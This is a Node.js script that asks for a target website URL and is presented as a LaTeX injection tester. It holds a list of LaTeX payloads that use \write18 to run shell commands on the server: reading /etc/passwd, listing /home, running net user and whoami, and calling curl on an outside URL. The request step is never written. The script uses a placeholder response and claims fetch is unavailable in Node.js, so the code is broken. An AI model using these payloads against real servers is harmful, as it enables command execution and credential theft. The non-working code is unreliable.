const readline = require('readline');

// Function to check if the target website is vulnerable to LaTeX injection
async function checkForLaTeXInjection(targetUrl) {
    try {
        // Define LaTeX payloads for collecting sensitive information
        const payloads = [
            '\\documentclass{article}\\begin{document}\\immediate\\write18{curl "https://example.com/sensitive_data"}\\end{document}',
            '\\documentclass{article}\\begin{document}\\immediate\\write18{cat /etc/passwd}\\end{document}',
            '\\documentclass{article}\\begin{document}\\immediate\\write18{ls -la /home}\\end{document}',
            '\\documentclass{article}\\begin{document}\\immediate\\write18{net user}\\end{document}',
            '\\documentclass{article}\\begin{document}\\immediate\\write18{whoami}\\end{document}'
            // Add more payloads as needed to collect other sensitive information
        ];

        // Iterate through payloads and send requests
        for (const payload of payloads) {
            console.log(`Testing payload: ${payload}`);
            // Simulate fetch request, as fetch is not available in Node.js
            const responseBody = "<Response from server>"; // Replace with actual response in Node.js

            // Highlight sensitive information
            const sensitiveInfoRegex = /sensitive_data|root|password|etc\/passwd|net user|whoami/i;
            const sensitiveInfoFound = responseBody.match(sensitiveInfoRegex);

            // Log the result
            if (sensitiveInfoFound) {
                console.log(`Sensitive information found in the response:`);
                console.log(responseBody.replace(sensitiveInfoRegex, (match) => `\x1b[31m${match}\x1b[0m`));
            } else {
                console.log(`No sensitive information found in the response.`);
            }
        }
    } catch (error) {
        console.error('Error occurred while testing for LaTeX injection:', error);
    }
}

// Create readline interface
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Prompt the user for the target website URL
rl.question("Enter your target website URL: ", (targetUrl) => {
    rl.close();
    if (targetUrl) {
        console.log(`Testing target website: ${targetUrl}`);
        checkForLaTeXInjection(targetUrl);
    } else {
        console.log("No target URL provided. Please provide a valid URL.");
    }
});
